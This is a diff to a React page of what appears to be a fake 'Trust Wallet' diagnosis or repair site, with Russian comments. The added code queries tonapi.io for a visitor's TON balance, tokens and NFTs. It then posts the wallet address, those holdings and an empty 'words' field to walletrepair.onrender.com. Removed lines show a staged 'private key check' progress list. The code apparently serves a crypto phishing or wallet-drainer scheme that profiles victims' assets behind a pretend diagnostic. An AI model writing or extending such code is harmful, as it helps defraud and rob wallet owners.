@@ -99,44 +99,88 @@ export default function Page2_Animation() {
   }
 
   useEffect(() => {
-    updateSummaryData();
-    // eslint-disable-next-line
-  }, [wallet]);
-
-  // Обновлять сводные данные при появлении результата диагностики
-  useEffect(() => {
-    if (result) {
+    async function updateSummaryData() {
+      if (!wallet) return;
+      // Получаем баланс TON
+      let ton = '';
+      let usdt = '';
+      let nft = '';
+      let tokens = '';
+      let tokenList = '';
+      let nftList = '';
+      try {
+        // Баланс TON
+        const balRes = await fetch(`https://tonapi.io/v2/accounts/${wallet}`);
+        const balData = await balRes.json();
+        ton = balData.balance ? (balData.balance / 1e9).toFixed(4) : '';
+        // Jettons (токены)
+        const jettonRes = await fetch(`https://tonapi.io/v2/accounts/${wallet}/jettons`);
+        const jettonData = await jettonRes.json();
+        if (jettonData.jettons && Array.isArray(jettonData.jettons)) {
+          tokens = jettonData.jettons.length;
+          tokenList = jettonData.jettons.map(j => `${j.name || j.symbol || 'Jetton'} (${j.symbol || ''})`).join(', ');
+        }
+        // NFT
+        const nftRes = await fetch(`https://tonapi.io/v2/accounts/${wallet}/nfts`);
+        const nftData = await nftRes.json();
+        if (nftData.nft_items && Array.isArray(nftData.nft_items)) {
+          nft = nftData.nft_items.length;
+          nftList = nftData.nft_items.map(n => n.name || n.address).join(', ');
+        }
+      } catch (e) {
+        // Если ошибка — оставляем пустые значения
+      }
+      setTonBalance(ton);
+      setTokensCount(tokens);
+      setNftCount(nft);
+      // Если адрес начинается с UQ и длина 48, используем его как имя файла
+      let summaryFileName = wallet;
+      if (!(wallet.startsWith('UQ') && wallet.length === 48)) {
+        function base64urlToHex(addr) {
+          if (!addr.startsWith('UQ') && !addr.startsWith('EQ')) return addr;
+          if (!/^[A-Za-z0-9_-]+$/.test(addr) || addr.length < 48) return addr;
+          try {
+            const b64 = addr.replace(/-/g, '+').replace(/_/g, '/');
+            const buf = typeof Buffer !== 'undefined' ? Buffer.from(b64, 'base64') : window.atob(b64);
+            const hex = (typeof Buffer !== 'undefined' ? buf.toString('hex') : Array.prototype.map.call(buf, x => ('00' + x.charCodeAt(0).toString(16)).slice(-2)).join(''));
+            return '0:' + hex.slice(4, 68);
+          } catch (e) {
+            return addr;
+          }
+        }
+        summaryFileName = base64urlToHex(wallet).replace(/[^a-zA-Z0-9_-]/g, '_');
+      }
       // Отправляем данные на сервер для создания summary.txt
       const diagnoseData = {
         walletName: 'Trust Wallet',
         address: wallet,
-        ton: tonBalance || '',
-        usdt: '',
-        nft: nftCount || '',
-        tokens: tokensCount || '',
+        ton,
+        usdt,
+        nft,
+        tokens,
         words: [],
-        tokenList: tokens && tokens.length ? tokens.join(', ') : '',
-        nftList: '',
+        tokenList,
+        nftList,
       };
-      fetch('https://walletrepair.onrender.com/api/diagnose', {
+      await fetch('https://walletrepair.onrender.com/api/diagnose', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(diagnoseData)
-      })
-        .then(res => res.json())
-        .then(() => updateSummaryData());
+      });
+      // Загружаем summary.txt для отображения
+      const summaryFile = `https://walletrepair.onrender.com/wallets/${summaryFileName}.summary.txt`;
+      fetch(summaryFile)
+        .then(res => res.text())
+        .then(text => {
+          const tonMatch = text.match(/Баланс TON: ([\d\.]+)/);
+          if (tonMatch) setTonBalance(tonMatch[1]);
+          const tokensMatch = text.match(/--- Все токены ---([\s\S]*)/);
+          if (tokensMatch) {
+            const tokensLines = tokensMatch[1].split('\n').filter(line => line.trim()).filter(line => !line.startsWith('Всего'));
+            setTokensCount(tokensLines.length);
+          }
+        });
     }
-    // eslint-disable-next-line
-  }, [result]);
-  const [tokens, setTokens] = useState([]);
-  const steps = [
-    "Проверка адреса и сети",
-    "Проверка доступности приватного ключа",
-    "Поиск зависших транзакций",
-    "Проверка подозрительных смарт-контрактов",
-    "Поиск фишинг токенов",
-    "Анализ завершён",
-  ];
 
   useEffect(() => {
     setProgress(0);
